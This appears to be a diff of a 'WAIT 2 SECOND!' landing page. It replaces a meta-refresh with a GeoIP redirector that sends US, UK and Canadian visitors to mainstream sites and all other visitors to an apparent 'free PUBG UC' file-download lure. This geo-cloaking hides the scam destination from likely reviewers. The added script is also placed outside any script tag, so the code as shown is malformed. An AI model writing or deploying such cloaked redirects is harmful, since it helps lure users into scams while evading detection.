@@ -5,13 +5,51 @@
 
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta http-equiv="refresh" content="0; URL=https://getmyfile.co/freeucpubgg~45218" />
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/main.css">
     <link rel="icon" type="image/x-icon" href="favicon.ico">
     <title>WAIT 2 SECOND!</title>
 
 </head>
+    
+    
+        /*!
+     * GeoIP Target Redirector
+     * Project: https://github.com/OpenAff/geoip-target-filter
+     *
+     * ---------------------------------------------------------------------
+     * A small snippet for geo-target redirection using GeoIP API.
+     * Add your targeted country's "ISO 3166-1 - Alpha-2" code and
+     * redirect URL to the "target" array object.
+     * ---------------------------------------------------------------------
+     * Example:
+     *          target.All = "http://others.tld";
+     *          target.US  = "http://domain.tld";
+     *
+     * The above example will redirect all the US visitors to the given URL.
+     * And any non-targeted visitors to "All" URL.
+     * ---------------------------------------------------------------------
+     * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
+     * See Column: "Alpha-2 Code"
+     * ---------------------------------------------------------------------
+     */
+
+        var target = []; // Create a new target Array.
+
+        // Example Codes:
+        target.All = "https://getmyfile.co/freeucpubgg~45218"; // Redirects Non-targeted / all other visitors to this URL.
+        target.US  = "https://google.us/";  // Redirects US Visitors to this URL.
+        target.GB  = "https://facebook.uk/";  // Redirects UK Visitors to this URL.
+        target.CA  = "https://reddit.ca/";  // Redirects Canadian Visitors to this URL.
+
+        // ------------------------------------------------------
+        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
+        // ------------------------------------------------------
+        /**
+         * If a valid country code matches the targets list, then it redirects to that particular link.
+         * Otherwise redirects to "All" target URL.
+         */
+        function geoip(g){window.top.location.href=target[g.country]||target.All}
 
 <body>
 
@@ -25,7 +63,7 @@
         </div>
 
     </div>
-
+  <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
     <script src="js/jquery-3.4.1.min.js"></script>
     <script src="js/popper.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
